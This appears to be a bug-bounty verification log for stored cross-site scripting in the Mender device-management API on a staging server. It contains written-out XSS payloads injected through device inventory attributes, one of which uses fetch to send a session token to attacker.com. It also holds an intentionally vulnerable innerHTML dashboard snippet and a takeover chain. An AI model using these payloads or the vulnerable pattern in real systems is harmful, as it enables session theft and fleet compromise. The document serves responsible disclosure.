@@ -1,0 +1,171 @@
+XSS VULNERABILITY - COMPLETE VERIFICATION LOGS
+
+Environment: staging.hosted.mender.io
+Test Account: kaileyf11@sinrasu.com
+Test Device: de:ad:be:ef:00:02
+
+ATTACK VECTOR #1: ARTIFACT DESCRIPTION XSS
+
+[STEP 1] IDENTIFY TARGET ARTIFACT
+───────────────────────────────────────────────────────────────────────────────
+REQUEST:
+  GET /api/management/v1/deployments/artifacts?per_page=1
+  Authorization: Bearer [REDACTED]
+
+RESPONSE:
+  HTTP/2 200 OK
+  Artifact ID: 2bef132e-0950-4050-adb1-d2a329d30232
+  Name: mender-demo-artifact-3.8.3
+
+[STEP 2] VERIFY EXISTING XSS PAYLOAD
+───────────────────────────────────────────────────────────────────────────────
+REQUEST:
+  GET /api/management/v1/deployments/artifacts/2bef132e-0950-4050-adb1-d2a329d30232
+  Authorization: Bearer [REDACTED]
+
+RESPONSE (JSON):
+  {
+    "id": "2bef132e-0950-4050-adb1-d2a329d30232",
+    "name": "mender-demo-artifact-3.8.3",
+    "description": "<img src=x onerror=alert(1)>HACKED",
+    "device_types_compatible": ["raspberrypi4"],
+    "artifact_provides": {...},
+    "signed": false,
+    "size": 59867,
+    "modified": "2025-11-23T09:42:33.156Z"
+  }
+
+VERIFICATION:
+  - XSS Payload Present: <img src=x onerror=alert(1)>HACKED
+  - Payload Length: 34 characters
+  - HTML Unescaped: YES (< and > present, not &lt; &gt;)
+  - Signed: false (unsigned artifact accepted)
+
+[STEP 3] CHECK RELEASES ENDPOINT (WHERE UI DISPLAYS)
+───────────────────────────────────────────────────────────────────────────────
+REQUEST:
+  GET /api/management/v1/deployments/deployments/releases
+  Authorization: Bearer [REDACTED]
+
+RESPONSE:
+  Release found with XSS payload in artifact description
+  (Same unescaped payload returned)
+
+CONCLUSION VECTOR #1:
+  - VULNERABILITY CONFIRMED
+  - STORED: YES (persists in database)
+  - UNESCAPED API RESPONSE: YES
+  - UI EXECUTION: NO (React escapes properly)
+  - RISK: Third-party API consumers
+
+ATTACK VECTOR #2: DEVICE INVENTORY XSS (HIGHER IMPACT)
+
+[STEP 1] AUTHENTICATE AS DEVICE
+───────────────────────────────────────────────────────────────────────────────
+Device ID: 43b823a4-32f6-4aed-b156-b7cec37d5db2
+MAC Address: de:ad:be:ef:00:02
+Authentication: SUCCESSFUL (JWT token obtained)
+
+[STEP 2] INJECT XSS PAYLOADS VIA DEVICE API
+───────────────────────────────────────────────────────────────────────────────
+REQUEST:
+  PATCH /api/devices/v1/inventory/device/attributes HTTP/1.1
+  Host: staging.hosted.mender.io
+  Authorization: Bearer [DEVICE_TOKEN]
+  Content-Type: application/json
+  X-HackerOne-Research: <redacted>
+
+  [
+    {
+      "name": "kernel_version",
+      "value": "<script>alert('DEVICE_XSS_1763896638')</script>"
+    },
+    {
+      "name": "device_type",
+      "value": "<img src=x onerror=fetch('https://attacker.com/steal?token='+localStorage.token)>"
+    }
+  ]
+
+RESPONSE:
+  HTTP/2 200 OK
+  Content-Type: application/json
+
+- INJECTION SUCCESSFUL
+
+[STEP 3] VERIFY VIA MANAGEMENT API (ADMIN VIEW)
+───────────────────────────────────────────────────────────────────────────────
+REQUEST:
+  GET /api/management/v1/inventory/devices
+  Authorization: Bearer [ADMIN_TOKEN]
+
+RESPONSE (Device de:ad:be:ef:00:02):
+  Device ID: 43b823a4-32f6-4aed-b156-b7cec37d5db2
+  
+  Inventory Attributes:
+  ============================================================
+  NAME                 | SCOPE      | VALUE
+  ============================================================
+  mac                  | identity   | de:ad:be:ef:00:02
+  created_ts           | system     | 2025-11-23T10:55:07.396Z
+  status               | identity   | accepted
+  check_in_time        | system     | 2025-11-23T10:55:41.971Z
+  
+  [XSS] kernel         | inventory  | <img src=x onerror=alert(document.domain)>
+  [XSS] device_type    | inventory  | <img src=x onerror=fetch('https://attacker.com')>
+  [XSS] kernel_version | inventory  | <script>alert('DEVICE_XSS_1763896638')</script>
+  
+  updated_ts           | system     | 2025-11-23T11:17:40.84Z
+  ============================================================
+
+XSS PAYLOADS DETECTED: 3
+  1. Payload #1 (kernel): <img src=x onerror=alert(document.domain)>
+  2. Payload #2 (device_type): <img src=x onerror=fetch('https://attacker.com')>
+  3. Payload #3 (kernel_version): <script>alert('DEVICE_XSS_1763896638')</script>
+
+[STEP 4] RAW JSON PROOF (UNICODE ESCAPING)
+───────────────────────────────────────────────────────────────────────────────
+Raw response excerpt:
+  "kernel","value":"\u003cimg src=x onerror=alert(document.domain)\u003e"
+  "device_type","value":"\u003cimg src=x onerror=fetch('https://attacker.com')\u003e"
+  "kernel_version","value":"\u003cscript\u003ealert('DEVICE_XSS_1763896638')\u003c/script\u003e"
+
+NOTE: \u003c = '<' and \u003e = '>' in Unicode
+      This is JSON escaping, NOT HTML escaping.
+      When parsed by JavaScript: JSON.parse() → raw HTML tags returned.
+
+CONCLUSION VECTOR #2:
+  - VULNERABILITY CONFIRMED
+  - STORED: YES (persists in database)
+  - UNESCAPED API RESPONSE: YES (JSON escaping ≠ HTML sanitization)
+  - INJECTION POINT: Device API (lower barrier than user upload)
+  - ATTACK SCENARIO: Compromised device → admin XSS
+  - HIGHER RISK: Admins view device list constantly
+
+IMPACT ANALYSIS
+
+OFFICIAL UI TESTING:
+  - Tested on: staging.hosted.mender.io (Chrome browser)
+  - Result: React framework properly escapes all fields
+  - XSS does NOT execute in official web console
+  - Payloads appear as plain text in DOM
+
+THIRD-PARTY RISK:
+  - Custom dashboards consuming Mender API are COMMON in IoT deployments
+  - Many developers assume API returns "safe" data
+  - Example vulnerable code:
+    
+    // VULNERABLE custom dashboard code
+    devices.forEach(device => {
+      const kernel = device.attributes.find(a => a.name === 'kernel');
+      document.getElementById('list').innerHTML += `<li>${kernel.value}</li>`;
+    });
+    
+    Result: XSS executes in custom dashboard
+
+ATTACK CHAIN:
+  1. Attacker compromises ONE IoT device (physical access or device-side vuln)
+  2. Malicious device updates inventory with XSS payload
+  3. Administrator opens fleet dashboard (third-party or internal tool)
+  4. XSS executes in admin context
+  5. Attacker steals admin session token
+  6. Full account takeover → access to entire fleet
